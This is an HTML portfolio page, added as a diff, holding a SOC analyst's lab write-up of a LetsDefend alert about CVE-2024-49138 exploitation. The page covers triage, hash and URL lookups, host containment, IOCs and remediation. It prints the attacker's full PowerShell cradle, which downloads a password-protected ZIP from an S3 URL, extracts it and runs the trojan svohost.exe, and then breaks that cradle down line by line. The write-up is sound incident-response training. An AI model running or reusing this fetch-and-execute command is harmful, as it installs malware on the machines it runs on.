@@ -1,0 +1,388 @@
+<!-- CVE-2024-49138 Windows Kernel Privilege Escalation Analysis -->
+<div class="detail-header">
+  <a href="#" class="back-button">← Back to Portfolio</a>
+  <h1>CVE-2024-49138: Windows Kernel Privilege Escalation via Malicious svohost.exe</h1>
+  <p><span class="tag">CVE-2024-49138</span> <span class="tag">Privilege Escalation</span> <span class="tag">PowerShell Download Cradle</span> <span class="tag">Password-Protected ZIP</span> <span class="tag">LetsDefend</span> <span class="tag">Incident Response</span> <span class="tag">Windows Security</span></p>
+</div>
+
+<div class="detail-content">
+
+  <!-- Disclaimer -->
+  <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
+    <h3>⚠️ ETHICAL LAB TESTING DISCLAIMER</h3>
+    <p><strong>This analysis was conducted on the LetsDefend.io SOC simulation platform.</strong> All activities were performed in a controlled, authorized training environment. The goal was educational - to learn how to detect, analyze, and respond to CVE-2024-49138 exploitation attempts as a SOC analyst.</p>
+  </div>
+
+  <!-- Step 1: Alert Triage -->
+  <div class="step">
+    <h3>📋 Step 1: Alert Triage & Ownership</h3>
+    <p>The LetsDefend.io practice dashboard was accessed and filtered for critical alerts. A critical severity alert (SOC335) was identified and ownership was taken to initiate the investigation.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-alert-dashboard.jpg" alt="LetsDefend Dashboard Critical Alert SOC335">
+      <div class="lab-image-caption">📸 LetsDefend dashboard - Critical alert SOC335 (CVE-2024-49138)</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Alert Details:</span><br>
+      <br>
+      SEVERITY: Critical<br>
+      RULE NAME: SOC335 - CVE-2024-49138 Exploitation Detected<br>
+      EVENT ID: 313<br>
+      TIME: Jan 22 2025, 14:37:12 UTC<br>
+      HOSTNAME: victor<br>
+      IP ADDRESS: 172.16.17.207<br>
+      PROCESS NAME: svohost.exe<br>
+      PROCESS PATH: C:\temp\service_installer\svohost.exe<br>
+      PROCESS ID: 7640<br>
+      PARENT PROCESS: powershell.exe<br>
+      PROCESS USER: EC2AMAZ-ILGVOIN\Victor<br>
+      DEVICE ACTION: Allowed
+    </div>
+  </div>
+
+  <!-- Step 2: Trigger Reason & Initial Analysis -->
+  <div class="step">
+    <h3>⚠️ Step 2: Alert Trigger Reason Analysis</h3>
+    <p>The trigger reason was reviewed to understand why this alert fired. The system detected unusual behavioral patterns linked to the file hash, indicating potential CVE-2024-49138 exploitation.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-trigger-reason.jpg" alt="Alert Trigger Reason">
+      <div class="lab-image-caption">📸 Trigger reason - Unusual behavior patterns linked to CVE-2024-49138</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Trigger Reason (from alert):</span><br>
+      <br>
+      "Unusual or suspicious patterns of behavior linked to the hash have been identified, indicating potential exploitation of CVE-2024-49138."<br>
+      <br>
+      <span style="color: #a6e22e;">Key observations at this stage:</span><br>
+      • Suspicious process name: <span style="color: #f92672;">svohost.exe</span> (typo-squatting legitimate svchost.exe)<br>
+      • Unusual path: <span style="color: #f92672;">C:\temp\service_installer\</span> (not Windows System32)<br>
+      • Parent process: <span style="color: #f92672;">powershell.exe</span> (scripted execution)<br>
+      • Command line: <span style="color: #f92672;">conhost.exe 0xffffffff -ForceV1</span> (console evasion technique)
+    </div>
+  </div>
+
+  <!-- Step 3: File Hash Analysis - VirusTotal -->
+  <div class="step">
+    <h3>🔬 Step 3: File Hash Analysis - VirusTotal</h3>
+    <p>The file hash from the alert was extracted and submitted to VirusTotal for malware analysis.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-hash-virustotal.jpg" alt="VirusTotal Hash Results">
+      <div class="lab-image-caption">📸 VirusTotal - 50/72 security vendors flagged the hash as malicious</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">VirusTotal Hash Results:</span><br>
+      <br>
+      <span style="color: #f92672;">SHA256:</span> b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9<br>
+      <span style="color: #f92672;">Detection Rate:</span> <span style="color: #ef4444;">50/72 security vendors flagged this file as malicious</span><br>
+      <span style="color: #f92672;">File Type:</span> Executable (PE32)<br>
+      <span style="color: #f92672;">Threat Labels:</span> Trojan, Backdoor, RAT, Loader<br>
+      <br>
+      <span style="color: #a6e22e;">Notable Vendor Detections:</span><br>
+      • Microsoft → Trojan:Win32/Wacatac.B!ml<br>
+      • McAfee → Ransomware-GF!<br>
+      • Symantec → Trojan.Gen.MBT<br>
+      • Kaspersky → HEUR:Trojan.Win32.Generic<br>
+      • BitDefender → Gen:Variant.Trojan.CobaltStrike<br>
+      • CrowdStrike → Win/malware_confidence_100% (D)
+    </div>
+    
+    <p><strong>Conclusion:</strong> The hash is confirmed malicious with high confidence (69% detection rate). The presence of CobaltStrike detection suggests this may be a beacon or RAT payload.</p>
+  </div>
+
+  <!-- Step 4: URL Analysis -->
+  <div class="step">
+    <h3>🌐 Step 4: Download URL Analysis - VirusTotal & Hybrid Analysis</h3>
+    <p>The download URL was extracted from the PowerShell command line and analyzed using VirusTotal and Hybrid Analysis sandbox.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-url-virustotal.jpg" alt="URL VirusTotal Results">
+      <div class="lab-image-caption">📸 VirusTotal - S3 bucket URL flagged as malicious</div>
+    </div>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-hybrid-analysis.jpg" alt="Hybrid Analysis Results">
+      <div class="lab-image-caption">📸 Hybrid Analysis - URL confirmed malicious with high threat score</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">URL Analysis Results:</span><br>
+      <br>
+      <span style="color: #f92672;">URL:</span> hxxps[://]files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/service-installer[.]zip<br>
+      <span style="color: #f92672;">Hosting Platform:</span> AWS S3 (us-east-2 region)<br>
+      <span style="color: #f92672;">VirusTotal Detection:</span> <span style="color: #ef4444;">Malicious</span><br>
+      <span style="color: #f92672;">Hybrid Analysis:</span> <span style="color: #ef4444;">Malicious - High threat score</span><br>
+      <span style="color: #f92672;">Archive Password:</span> infected (evasion technique)<br>
+      <br>
+      <span style="color: #a6e22e;">Red flags identified:</span><br>
+      • Password-protected ZIP (bypasses static AV scanning)<br>
+      • S3 bucket naming "files-ld" (non-standard, suspicious)<br>
+      • Downloaded to C:\temp\ (temporary, non-standard location)<br>
+      • Requires 7-Zip for extraction (unusual for legitimate software)
+    </div>
+  </div>
+
+  <!-- Step 5: Immediate Containment -->
+  <div class="step">
+    <h3>🛑 Step 5: Immediate Containment Action</h3>
+    <p>Based on the malicious hash confirmation and suspicious URL, the affected endpoint was immediately contained to prevent further attacker activity, lateral movement, and potential data exfiltration.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-contain-endpoint.jpg" alt="Contain Endpoint Action">
+      <div class="lab-image-caption">📸 Immediate containment action - Isolated victor endpoint from network</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Containment Action Taken:</span><br>
+      <br>
+      ✓ <span style="color: #a6e22e;">Isolated host "victor" (172.16.17.207)</span> from the network<br>
+      ✓ <span style="color: #a6e22e;">Prevented further C2 communication</span> from svohost.exe (PID 7640)<br>
+      ✓ <span style="color: #a6e22e;">Blocked lateral movement</span> to other hosts in the environment<br>
+      ✓ <span style="color: #a6e22e;">Preserved endpoint state</span> for forensic investigation<br>
+      <br>
+      <span style="color: #fd971f;">Containment Rationale:</span><br>
+      • Malicious process was actively running (PID 7640)<br>
+      • Potential C2 beaconing to attacker infrastructure<br>
+      • Risk of privilege escalation (CVE-2024-49138)<br>
+      • Need to preserve evidence before any volatile data loss
+    </div>
+    
+    <p><strong>Security best practice applied:</strong> Containment was performed <strong>before</strong> deep investigation (terminal history review) to ensure the attacker could not continue operating while the attack chain was analyzed.</p>
+  </div>
+
+  <!-- Step 6: PowerShell Terminal History (Post-Containment) -->
+  <div class="step">
+    <h3>📜 Step 6: PowerShell Terminal History Analysis (Post-Containment)</h3>
+    <p>After containing the endpoint, the endpoint security logs for the affected host (victor) were reviewed and the complete PowerShell command line history was retrieved, revealing the full attack chain.</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-terminal-history.jpg" alt="PowerShell Terminal History">
+      <div class="lab-image-caption">📸 Endpoint security logs - PowerShell command history showing full attack sequence</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">PowerShell Command History:</span><br>
+      <br>
+      <span style="color: #fd971f;">[14:36:06]</span> "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"<br>
+      <span style="color: #fd971f;">[14:36:26]</span> "C:\Windows\system32\whoami.exe" /priv<br>
+      <span style="color: #fd971f;">[14:36:38]</span> "C:\Windows\system32\whoami.exe"<br>
+      <span style="color: #fd971f;">[14:37:10]</span> $url = 'https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip'; $dest = 'C:\temp\service-installer.zip'; $extractPath = 'C:\temp'; $password = 'infected'; if (-not (Test-Path -Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath -Force | Out-Null }; Invoke-WebRequest -Uri $url -OutFile $dest; $7zipPath = 'C:\Program Files\7-Zip\7z.exe'; Start-Process -FilePath $7zipPath -ArgumentList "x -p$password -o$extractPath $dest" -NoNewWindow -Wait -PassThru; Remove-Item -Path $dest; Start-Process -FilePath "$extractPath\service_installer\svohost.exe"<br>
+      <span style="color: #fd971f;">[14:37:59]</span> "C:\Windows\system32\whoami.exe"
+    </div>
+    
+    <p><strong>Attack chain reconstructed:</strong></p>
+    <ul>
+      <li><strong>14:36:06</strong> - PowerShell launched</li>
+      <li><strong>14:36:26</strong> - <code>whoami /priv</code> (privilege enumeration - attacker assessing capabilities for CVE-2024-49138)</li>
+      <li><strong>14:36:38</strong> - <code>whoami</code> (user/hostname confirmation)</li>
+      <li><strong>14:37:10</strong> - Download cradle executed (full PowerShell one-liner)</li>
+      <li><strong>14:37:59</strong> - Final <code>whoami</code> (post-execution reconnaissance)</li>
+    </ul>
+  </div>
+
+  <!-- Step 7: Malicious Script Breakdown -->
+  <div class="step">
+    <h3>📝 Step 7: Malicious PowerShell Script Breakdown</h3>
+    <p>The PowerShell command was analyzed to understand exactly what the attacker executed.</p>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Script Analysis:</span><br>
+      <br>
+      <span style="color: #a6e22e;">1. Variable Declaration</span><br>
+      $url = 'https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip'<br>
+      $dest = 'C:\temp\service-installer.zip'<br>
+      $extractPath = 'C:\temp'<br>
+      $password = 'infected'<br>
+      <br>
+      <span style="color: #a6e22e;">2. Directory Creation (if missing)</span><br>
+      if (-not (Test-Path -Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath -Force }<br>
+      <br>
+      <span style="color: #a6e22e;">3. Download Payload</span><br>
+      Invoke-WebRequest -Uri $url -OutFile $dest<br>
+      <br>
+      <span style="color: #a6e22e;">4. Extract with 7-Zip (password protected)</span><br>
+      Start-Process -FilePath 'C:\Program Files\7-Zip\7z.exe' -ArgumentList "x -pinfected -oC:\temp C:\temp\service-installer.zip"<br>
+      <br>
+      <span style="color: #a6e22e;">5. Cleanup (anti-forensics)</span><br>
+      Remove-Item -Path $dest<br>
+      <br>
+      <span style="color: #a6e22e;">6. Execute Payload</span><br>
+      Start-Process -FilePath "C:\temp\service_installer\svohost.exe"<br>
+      <br>
+      <span style="color: #f92672;">Tactics Used (MITRE ATT&CK):</span><br>
+      • T1059.001 - Command and Scripting Interpreter: PowerShell<br>
+      • T1105 - Ingress Tool Transfer<br>
+      • T1560.002 - Archive Collected Data: Archive via 7-Zip<br>
+      • T1070.004 - Indicator Removal: File Deletion<br>
+      • T1204.002 - User Execution: Malicious File
+    </div>
+  </div>
+
+  <!-- Step 8: Running Process Verification -->
+  <div class="step">
+    <h3>🔄 Step 8: Running Process Verification</h3>
+    <p>The running processes on the affected endpoint were checked to confirm the malicious binary was still active (prior to containment).</p>
+    
+    <div class="lab-image">
+      <img src="assets/images/lab10-running-process.jpg" alt="Running Processes Showing svohost.exe">
+      <div class="lab-image-caption">📸 Process list - svohost.exe (PID 7640) actively running before containment</div>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Running Process Details:</span><br>
+      <br>
+      <span style="color: #f92672;">Event Time:</span> Jan 22 2025 14:37:12<br>
+      <span style="color: #f92672;">Process ID:</span> 7640<br>
+      <span style="color: #f92672;">Image Path:</span> C:\temp\service_installer\svohost.exe<br>
+      <span style="color: #f92672;">File Hash:</span> b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9<br>
+      <span style="color: #f92672;">Process User:</span> EC2AMAZ-ILGVOIN\Victor<br>
+      <span style="color: #f92672;">Parent Name:</span> powershell.exe<br>
+      <span style="color: #f92672;">Parent Path:</span> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br>
+      <span style="color: #f92672;">Command Line:</span> "C:\temp\service_installer\svohost.exe"<br>
+      <span style="color: #f92672;">Target Process Command Line:</span> \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1<br>
+      <br>
+      <span style="color: #a6e22e;">Observation:</span> The process was actively running at the time of detection. Containment was immediately triggered to sever any active C2 communication.
+    </div>
+  </div>
+
+  <!-- Step 10: IOC Summary -->
+  <div class="step">
+    <h3>📌 Step 10: Indicators of Compromise (IOCs) Summary</h3>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Network IOCs:</span><br>
+      <br>
+      • <span style="color: #f92672;">Malicious URL:</span> hxxps[://]files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/service-installer[.]zip<br>
+      • <span style="color: #f92672;">S3 Bucket:</span> files-ld.s3.us-east-2.amazonaws.com<br>
+      • <span style="color: #f92672;">AWS Region:</span> us-east-2 (Ohio)<br>
+      • <span style="color: #f92672;">Affected Host IP:</span> 172.16.17.207<br>
+      • <span style="color: #f92672;">Archive Password:</span> infected<br>
+      <br>
+      <span style="color: #66d9ef;">File IOCs:</span><br>
+      <br>
+      • <span style="color: #f92672;">SHA256 Hash:</span> b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9<br>
+      • <span style="color: #f92672;">File Name:</span> svohost.exe (masquerading as svchost.exe)<br>
+      • <span style="color: #f92672;">File Path:</span> C:\temp\service_installer\svohost.exe<br>
+      • <span style="color: #f92672;">Archive Name:</span> service-installer.zip<br>
+      • <span style="color: #f92672;">VT Detection Rate:</span> 50/72 (69.4%)<br>
+      <br>
+      <span style="color: #66d9ef;">Process IOCs:</span><br>
+      <br>
+      • <span style="color: #f92672;">Process Name:</span> svohost.exe<br>
+      • <span style="color: #f92672;">Parent Process:</span> powershell.exe<br>
+      • <span style="color: #f92672;">Process ID:</span> 7640<br>
+      • <span style="color: #f92672;">Process User:</span> EC2AMAZ-ILGVOIN\Victor<br>
+      • <span style="color: #f92672;">Conhost Argument:</span> \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+    </div>
+  </div>
+
+  <!-- Step 11: Response Actions Taken -->
+  <div class="step">
+    <h3>🛡️ Step 11: Response Actions Taken</h3>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">Actions Performed (Tier 1):</span><br>
+      <br>
+      1. ✓ <span style="color: #a6e22e;">Ownership taken</span> of alert SOC335<br>
+      2. ✓ <span style="color: #a6e22e;">Malicious hash confirmed</span> via VirusTotal (50/72 detections)<br>
+      3. ✓ <span style="color: #a6e22e;">Malicious URL confirmed</span> via Hybrid Analysis & VirusTotal<br>
+      4. ✓ <span style="color: #a6e22e; font-weight: bold;">Endpoint IMMEDIATELY CONTAINED</span> (victor / 172.16.17.207)<br>
+      5. ✓ <span style="color: #a6e22e;">Attack chain reconstructed</span> from PowerShell history (post-containment)<br>
+      6. ✓ <span style="color: #a6e22e;">Active compromise verified</span> (svohost.exe PID 7640 was running)<br>
+      7. ✓ <span style="color: #a6e22e;">Escalated to Tier 2</span> for eradication and recovery<br>
+      <br>
+    </div>
+  </div>
+
+  <!-- Investigation Summary -->
+  <div class="step">
+    <h3>📊 Investigation Summary</h3>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 1.5rem 0;">
+      <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🚨</div>
+        <div><strong>Alert Source</strong></div>
+        <div style="font-size: 0.9rem;">LetsDefend SOC335 Medium</div>
+      </div>
+      
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🔬</div>
+        <div><strong>Hash Detection</strong></div>
+        <div style="font-size: 0.9rem;">50/72 VT vendors</div>
+      </div>
+      
+      <div style="background: rgba(245, 158, 11, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🌐</div>
+        <div><strong>Malicious URL</strong></div>
+        <div style="font-size: 0.9rem;">AWS S3 - Hybrid Analysis confirmed</div>
+      </div>
+      
+      <div style="background: rgba(139, 92, 246, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🛑</div>
+        <div><strong>Containment</strong></div>
+        <div style="font-size: 0.9rem;">Immediate isolation performed</div>
+      </div>
+      
+      <div style="background: rgba(16, 185, 129, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
+        <div style="font-size: 2rem;">🔄</div>
+        <div><strong>Process Status</strong></div>
+        <div style="font-size: 0.9rem;">svohost.exe (PID 7640) - Contained</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Final Verdict -->
+  <div class="step">
+    <h3>✅ Final Verdict</h3>
+    
+    <div class="command-box" style="background: rgba(239, 68, 68, 0.2); border: 2px solid #ef4444;">
+      <span style="color: #ef4444; font-size: 1.2rem; font-weight: bold;">🚨 TRUE POSITIVE - CONFIRMED COMPROMISE (CONTAINED)</span><br>
+      <br>
+      <span style="color: #a6e22e;">Evidence Collected:</span><br>
+      ✓ Malicious file hash (50/72 VT detection - includes CobaltStrike, RAT, Trojan)<br>
+      ✓ Malicious download URL (AWS S3 bucket) confirmed by Hybrid Analysis<br>
+      ✓ PowerShell command history showing complete attack chain<br>
+      ✓ Password-protected ZIP extraction (infected) - evasion technique<br>
+      ✓ svohost.exe running from non-standard path (C:\temp\service_installer\)<br>
+      ✓ whoami /priv executed before payload (privilege enumeration for CVE-2024-49138)<br>
+      ✓ ZIP file deleted after extraction (anti-forensics behavior)<br>
+      ✓ Alert triggered by CVE-2024-49138 exploitation behavior patterns<br>
+      ✓ <span style="color: #a6e22e; font-weight: bold;">Endpoint successfully contained immediately after detection</span><br>
+      <br>
+      <span style="color: #ef4444;">Compromise Confirmed & Contained.</span> Escalated to Tier 2 for eradication and recovery.
+    </div>
+  </div>
+
+  <!-- Recommendations -->
+  <div class="step">
+    <h3>🛡️ Recommendations</h3>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem;">
+      <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #ef4444;">
+        <h4>Immediate</h4>
+        <ul>
+          <li><strong>Maintain endpoint isolation</strong> for victor (already contained)</li>
+          <li>Kill PID 7640 (svohost.exe)</li>
+          <li>Delete C:\temp\service_installer\ folder</li>
+          <li>Block files-ld.s3.us-east-2.amazonaws.com at firewall</li>
+          <li>Block hash in EDR/AV across environment</li>
+        </ul>
+      </div>
+      
+      <div style="background: rgba(245, 158, 11, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #f59e0b;">
+        <h4>Remediation (Tier 2/3)</h4>
+        <ul>
+          <li>Apply CVE-2024-49138 patch to all Windows systems</li>
+          <li>Check for persistence (Run keys, scheduled tasks, services)</li>
+          <li>Reset Victor's credentials and check for lateral movement</li>
+          <li>Preserve svohost.exe for forensic analysis</li>
+          <li>Review S3 bucket access logs if available</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
